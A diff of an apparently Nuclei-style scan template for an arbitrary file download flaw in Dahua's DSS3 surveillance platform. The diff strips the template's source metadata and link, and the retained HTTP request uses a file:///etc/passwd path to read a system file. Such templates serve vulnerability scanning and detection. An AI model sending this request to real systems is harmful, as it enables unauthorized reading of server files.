@@ -3,12 +3,8 @@ info:
   name: 大华城市安防监控系统平台管理 DSS3 任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/so9h8tlkwcp4ayga'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: so9h8tlkwcp4ayga
-    fofa: 暂无
 http:
 - raw:
   - 'GET /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HTTP/1.1
